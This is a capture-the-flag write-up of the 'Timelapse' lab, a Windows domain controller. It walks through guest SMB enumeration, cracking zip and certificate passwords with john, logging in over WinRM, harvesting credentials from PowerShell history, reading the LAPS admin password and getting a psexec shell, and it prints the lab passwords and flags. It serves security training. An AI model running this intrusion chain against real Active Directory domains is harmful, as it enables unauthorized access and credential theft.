
# CTF Writeup: Timelapse

---
## Reconnaissance

An initial scan revealed the following running services on the target system.

```
nmap -n -Pn -sS -p- 10.129.227.113   
Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-19 13:24 -0500
Nmap scan report for 10.129.227.113
Host is up (0.047s latency).
Not shown: 65518 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5986/tcp  open  wsmans
9389/tcp  open  adws
49667/tcp open  unknown
49673/tcp open  unknown
49674/tcp open  unknown
49692/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 161.27 seconds
```

An more detailled scan revealed further information about the services.

```
nmap -n -Pn -sSCV -p 53,88,135,139,389,445,464,593,636,3268,3269,5986,9389,49667,49673,49674,49692 10.129.227.113
Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-19 13:29 -0500
Nmap scan report for 10.129.227.113
Host is up (0.052s latency).

PORT      STATE SERVICE           VERSION
53/tcp    open  domain            Simple DNS Plus
88/tcp    open  kerberos-sec      Microsoft Windows Kerberos (server time: 2026-06-20 02:29:13Z)
135/tcp   open  msrpc             Microsoft Windows RPC
139/tcp   open  netbios-ssn       Microsoft Windows netbios-ssn
389/tcp   open  ldap              Microsoft Windows Active Directory LDAP (Domain: timelapse.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ldapssl?
3268/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: timelapse.htb, Site: Default-First-Site-Name)
3269/tcp  open  globalcatLDAPssl?
5986/tcp  open  ssl/wsmans?
|_ssl-date: 2026-06-20T02:30:44+00:00; +7h59m56s from scanner time.
| tls-alpn: 
|   h2
|_  http/1.1
| ssl-cert: Subject: commonName=dc01.timelapse.htb
| Not valid before: 2021-10-25T14:05:29
|_Not valid after:  2022-10-25T14:25:29
9389/tcp  open  mc-nmf            .NET Message Framing
49667/tcp open  msrpc             Microsoft Windows RPC
49673/tcp open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc             Microsoft Windows RPC
49692/tcp open  msrpc             Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-06-20T02:30:07
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
|_clock-skew: mean: 7h59m55s, deviation: 0s, median: 7h59m54s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 99.51 seconds
```

The nmap scan revealed information about the domainname & hostname. The target itself seems to be an DC. 

Let's map them to the target ip in our local dns file.

```
echo "10.129.227.113 dc01.timelapse.htb timelapse.htb dc01" | tee -a /etc/hosts
```

Enumerated users with "guest" access. 

```
nxc smb timelapse.htb -u 'guest' -p '' --shares
SMB         10.129.227.113  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:timelapse.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.227.113  445    DC01             [+] timelapse.htb\guest: 
SMB         10.129.227.113  445    DC01             [*] Enumerated shares
SMB         10.129.227.113  445    DC01             Share           Permissions     Remark
SMB         10.129.227.113  445    DC01             -----           -----------     ------
SMB         10.129.227.113  445    DC01             ADMIN$                          Remote Admin
SMB         10.129.227.113  445    DC01             C$                              Default share
SMB         10.129.227.113  445    DC01             IPC$            READ            Remote IPC
SMB         10.129.227.113  445    DC01             NETLOGON                        Logon server share 
SMB         10.129.227.113  445    DC01             Shares          READ            
SMB         10.129.227.113  445    DC01             SYSVOL                          Logon server share
```

There is one non-default SMB Share "Shares" and we got READ Access to it. Let's check it out before proceeding.

Downloaded everything onto local machine.

```
recurse ON
prompt OFF
mget *
```

The .docx files were rather odd since they were encrypted. I unzipped then and analyzed there contents, but wasn't able to find anything properly.
The "Dev" Folder was interesting there was an .zip file called "winrm-backup.zip".

I tried unzipping the file, but it prompted me the passphrase of an .pfx certifcate file. Which I didn't have. I decided to utilize an tool I already previously had experience with named "zip2john" to convert the zip file itself to an hash which we can then potentially use to bruteforce an passphrase.

```
zip2john winrm_backup.zip
```

Got it.

```
john pfx_hash --wordlist=/usr/share/wordlists/rockyou.txt     
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
supremelegacy    (winrm_backup.zip/legacyy_dev_auth.pfx)     
1g 0:00:00:00 DONE (2026-06-19 13:54) 3.225g/s 11204Kp/s 11204Kc/s 11204KC/s surkerior..superkebab
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

We unzipped the file the archive and gained an .pfx file.

```
unzip winrm_backup.zip 
Archive:  winrm_backup.zip
[winrm_backup.zip] legacyy_dev_auth.pfx password: 
  inflating: legacyy_dev_auth.pfx
```

The .pfx was encrypted aswell since the .pfx file usually holds the private key of the CA I somehow need to crack it aswell. I then decided to check intuitiivley if there is an tool for it and yes there is! The tool is named "pfx2john" similiar to "zip2john".

I used the tool to convert the .pfx file into hash format so we can use john the ripper to bruteforce the private key of the internal CA and potentially connect to the target system using this key.

```
pfx2john legacyy_dev_auth.pfx
```

This just seemed to be an passphrase. After further education I came to the conclusion that I can utilize this passphrase in order to "extract" the .cert and .pem file from the .pfx bundle of certificates using OpenSSL.

```
john private_key --wordlist=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (pfx, (.pfx, .p12) [PKCS#12 PBE (SHA1/SHA2) 256/256 AVX2 8x])
Cost 1 (iteration count) is 2000 for all loaded hashes
Cost 2 (mac-type [1:SHA1 224:SHA224 256:SHA256 384:SHA384 512:SHA512]) is 1 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
thuglegacy       (legacyy_dev_auth.pfx)     
1g 0:00:01:02 DONE (2026-06-19 14:02) 0.01591g/s 51428p/s 51428c/s 51428C/s thuglife06..thsco04
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Extracted the certificate

```
openssl pkcs12 -in legacyy_dev_auth.pfx -clcerts -nokeys -out key.cert
```

Extracted the private key.

```
openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out key.pem -nodes
```

Connected to the target system using "evil-winrm" and SSL Auth.

```
evil-winrm -i timelapse.htb -c key.cert -k key.pem -S
```

Retrieved user.txt in C:\Users\legacyy\Desktop

```
19016a7f7085e95c418df2cadbc78a33
```

Checked groups and permissions of our current user and found out he is in an non-default group called "Development".

```
whoami /all
```

I checked out user "legacyy"s PS History and found new credentials for an service account called "svc_deploy".

```
*Evil-WinRM* PS C:\Users\legacyy\Desktop> type C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
whoami
ipconfig /all
netstat -ano |select-string LIST
$so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck
$p = ConvertTo-SecureString 'E3R$Q62^12p7PLlC%KWaxuaV' -AsPlainText -Force
$c = New-Object System.Management.Automation.PSCredential ('svc_deploy', $p)
invoke-command -computername localhost -credential $c -port 5986 -usessl -
SessionOption $so -scriptblock {whoami}
get-aduser -filter * -properties *
exit
```

```
svc_deploy:E3R$Q62^12p7PLlC%KWaxuaV
```

Logged into the target system as this user via evil-winrm.

```
evil-winrm -i timelapse.htb -u svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV' -S
```

Checked groups and permissions of our current user and found out he is in an non-default group called "LAPS_Readers".

```
whoami /all
```

I decided to transfer winPEAS onto the target system and ran it but I wasn't able to find anything. I moved by downloading domain information using bloodhound-python. 

```
bloodhound-python -u "svc_deploy" -p 'E3R$Q62^12p7PLlC%KWaxuaV' -ns 10.129.19.12 -d timelapse.htb -c all
```

I then started up bloodhound on my local machine.

```
neo4j console
bloodhound
```

I was able to find out what this group can do, there is an policy set for this group called "ReadLAPSPassword" on the Domain Controller itself.

![](Pasted%20image%2020260619222256.png)

If an user is part of the LAPS_Readers Group or has "ReadLAPSPassword" as policy set he can read the admin password.

LAPS or "Local Administrator Password Solution" is a in-built windows tool in which passwords of local admin accounts are being randomly generated. Only Administrators of this group are able to view passwords. 

Viewed the password of the local admin account with the following command:

```
Get-ADComputer -Filter 'ObjectClass -eq "computer"' -Property *
```

The Password can be found under "ms-Mcs-AdmPwd".

```
Mm}KJq5P0%$I7U8zHP19Mk28
```

Connected to the target system as "Administrator" via psexec

```
impacket-psexec Administrator:'Mm}KJq5P0%$I7U8zHP19Mk28'@timelapse.htb
```

Retrieved root.txt in C:\Users\TRX\Desktop.

```
2ba47c5eae54d4797ff0269660dd2616
```
